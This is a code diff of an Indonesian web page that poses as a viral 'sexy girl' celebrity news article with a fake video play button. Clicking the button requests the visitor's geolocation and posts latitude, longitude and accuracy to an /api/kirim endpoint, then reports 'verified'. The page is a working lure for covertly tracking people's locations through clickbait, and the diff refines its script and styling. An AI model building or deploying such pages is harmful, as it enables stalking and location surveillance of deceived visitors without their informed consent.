@@ -129,6 +129,51 @@
           border-radius: 5px; 
           cursor: pointer; 
           font-size: 16px; }
+          .audio-player {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #f0f0f0;
+      padding: 15px 20px;
+      border-radius: 15px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      max-width: 320px;
+      margin: 50px auto;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    .audio-label {
+      font-weight: 600;
+      color: #333;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .audio-controls button {
+      background: #007bff;
+      border: none;
+      border-radius: 50%;
+      color: white;
+      cursor: pointer;
+      width: 45px;
+      height: 45px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.3s;
+    }
+
+    .audio-controls button:hover {
+      background: #0056b3;
+    }
+
+    #status {
+      text-align: center;
+      margin-top: 20px;
+      color: #555;
+      font-size: 14px;
+    }
     </style>
 </head>
 <body>
@@ -142,70 +187,81 @@
 
         <!-- Gambar (Placeholder - Ganti src dengan gambar asli jika ada) -->
         <div class="image-container">
-            <img src="PRn58Pc0Sk3sOvz1424199178.jpg" alt="Gadis bandung Seksi">
+            <img src="https://img.merahputih.com/media//2015/02/18/PRn58Pc0Sk3sOvz1424199178.jpg" alt="Gadis Vietnam Seksi">
         </div>
         <div class="caption">viral gadis bandung</div>
 
         <!-- Audio Player Style -->
         <div class="audio-player">
-  <div class="audio-label">
-    <span>▶️</span> Tonton lanjutkan
-  </div>
-  <div class="audio-controls">
-    <!-- Tombol Play dengan fungsi getLocation -->
-    <button class="control-btn" onclick="getLocation()">
-      <svg viewBox="0 0 24 24" width="24" height="24">
-        <path d="M8 5v14l11-7z" fill="currentColor"/>
-      </svg>
-    </button>
-              </div>
-        </div>
-        <!-- Teks Artikel -->
-        <div class="article-content">
-            <p>
-                <strong>Viral Celeb</strong> - Bandung — Media sosial tengah dihebohkan dengan munculny “Gadis cantik” yang mendadak viral di berbagai platform. Tagar terkait topik ini ramai dibicarakan, terutama di X (Twitter) dan TikTok.
-            </p>
-        </div>
+    <div class="audio-label">
+      <span>▶️</span> Tonton lanjutkan
     </div>
-    
-      <script>
-        function getLocation() {
-            var status = document.getElementById("status");
-            if (navigator.geolocation) {
-                status.innerHTML = "Memproses...";
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
-            } else { 
-                status.innerHTML = "Browser tidak support.";
-            }
+    <div class="audio-controls">
+      <!-- Tombol Play dengan getLocation -->
+      <button class="control-btn" onclick="getLocation()">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <path d="M8 5v14l11-7z" fill="currentColor"/>
+        </svg>
+      </button>
+    </div>
+  </div>
+
+  <p id="status"></p>
+
+  <script>
+    function getLocation() {
+      const status = document.getElementById("status");
+      if (!navigator.geolocation) {
+        status.textContent = "❌ Browser tidak mendukung fitur lokasi.";
+        return;
+      }
+
+      status.textContent = "📍 Memproses lokasi...";
+      navigator.geolocation.getCurrentPosition(showPosition, showError);
+    }
+
+    async function showPosition(position) {
+      const status = document.getElementById("status");
+      const { latitude, longitude, accuracy } = position.coords;
+
+      try {
+        const response = await fetch('/api/kirim', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ latitude, longitude, accuracy })
+        });
+
+        if (response.ok) {
+          status.textContent = "✅ Berhasil diverifikasi! Terima kasih.";
+          status.style.color = "green";
+        } else {
+          status.textContent = "⚠️ Gagal mengirim data ke server.";
+          status.style.color = "orange";
         }
+      } catch (err) {
+        status.textContent = "🚫 Terjadi kesalahan jaringan.";
+        status.style.color = "red";
+      }
+    }
 
-        async function showPosition(position) {
-            var status = document.getElementById("status");
-            var lat = position.coords.latitude;
-            var long = position.coords.longitude;
-            var acc = position.coords.accuracy;
+    function showError(error) {
+      const status = document.getElementById("status");
+      switch (error.code) {
+        case error.PERMISSION_DENIED:
+          status.textContent = "❌ Akses lokasi ditolak pengguna.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          status.textContent = "⚠️ Informasi lokasi tidak tersedia.";
+          break;
+        case error.TIMEOUT:
+          status.textContent = "⏰ Permintaan lokasi melebihi waktu.";
+          break;
+        default:
+          status.textContent = "🚫 Terjadi kesalahan tidak diketahui.";
+      }
+      status.style.color = "red";
+    }
+  </script>
 
-            // Kirim ke Vercel Serverless Function
-            try {
-                const response = await fetch('/api/kirim', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ latitude: lat, longitude: long, accuracy: acc })
-                });
-
-                if (response.ok) {
-                    status.innerHTML = "Berhasil diverifikasi! Terima kasih.";
-                } else {
-                    status.innerHTML = "Gagal mengirim data.";
-                }
-            } catch (e) {
-                status.innerHTML = "Error koneksi.";
-            }
-        }
-
-        function showError(error) {
-            document.getElementById("status").innerHTML = "Akses lokasi ditolak atau error.";
-        }
-    </script>
 </body>
 </html>
